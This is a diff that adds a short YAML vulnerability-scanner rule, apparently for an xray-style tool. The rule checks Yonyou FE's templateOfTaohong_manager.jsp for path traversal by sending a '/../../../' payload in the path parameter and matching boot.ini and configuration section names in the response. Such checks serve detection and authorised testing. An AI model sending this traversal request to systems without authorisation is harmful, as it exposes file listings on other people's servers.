@@ -1,0 +1,8 @@
+name: yongyou-fe-templateoftaohong-manager-path-traversal
+rules:
+  - method: GET
+    path: "/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'boot.ini')&& response.body.bcontains(b'[FE_MESSAGE_PUSH]')&& response.body.bcontains(b'[OA]')
+detail:
+  author: 666
